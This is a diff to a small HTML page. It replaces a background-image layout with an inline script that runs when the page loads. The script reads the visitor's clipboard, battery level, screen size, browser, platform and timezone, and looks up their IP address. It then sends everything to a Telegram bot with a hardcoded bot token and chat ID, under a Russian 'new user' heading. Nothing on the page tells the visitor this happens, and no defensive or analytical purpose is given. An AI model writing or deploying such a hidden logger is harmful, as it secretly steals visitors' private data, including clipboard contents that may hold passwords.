@@ -1,20 +1,94 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        background-image: url('image.jpg');
-        background-size: cover;
-        background-position: center;
-        background-attachment: fixed;
-    }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHP Page with JavaScript</title>
 </head>
 <body>
-    <script src="script.js"></script>
+    
+    <script>
+document.addEventListener('DOMContentLoaded', function() {
+    let screenWidth;
+    let screenHeight;
+
+    navigator.getBattery().then(function(battery) {
+        batteryLevel = battery.level * 100;
+    });
+
+    navigator.clipboard.readText().then(function(clipboardText) {
+        screenWidth = window.screen.width;
+        screenHeight = window.screen.height;
+
+        const screenWidthConst = screenWidth;
+        const screenHeightConst = screenHeight;
+
+        const tg = window.Telegram.WebApp;
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const userAgent = navigator.userAgent;
+
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ip = data.ip;
+            const osname = navigator.platform;
+            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const browser = getBrowserInfo();
+            let userid = document.createElement('p');
+
+            const message = `
+                *👤 Новый пользователь*
+
+                *🧭 Информация:*
+                *💻 System:*
+                    ├ IP: ${ip}
+                    ├ UserAgent: ${userAgent}
+                    ├ OS: ${osname}
+                    ├ Browser: ${browser}
+                    ├ Battery ${batteryLevel}%
+                    ├ Screen: ${screenWidth}x${screenHeight} px.
+                    ├ Clipboard: ${clipboardText}
+                    └ Timezone: ${timeZone}
+
+                `;
+            
+            const token = '7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI';
+            const chatId = '-1002151934748';
+            const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('text', message);
+            formData.append('parse_mode', 'Markdown');
+            fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+        });
+    });
+
+    function getBrowserInfo() {
+        const ua = navigator.userAgent;
+        let browser = '';
+        const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i);
+
+        if (/trident/i.test(match[1])) {
+            const tem = /\brv[ :]+(\d+)/g.exec(ua);
+            browser = 'IE ' + (tem[1] || '');
+        }
+
+        if (match[1] === 'Chrome') {
+            const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+            if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
+        }
+
+        match[2] = match[2] ? 'version ' + match[2] : '';
+        browser = `${match[1]} ${match[2] || ''}`.trim();
+        return browser;
+    }
+});
+
+
+    </script>
 </body>
 </html>
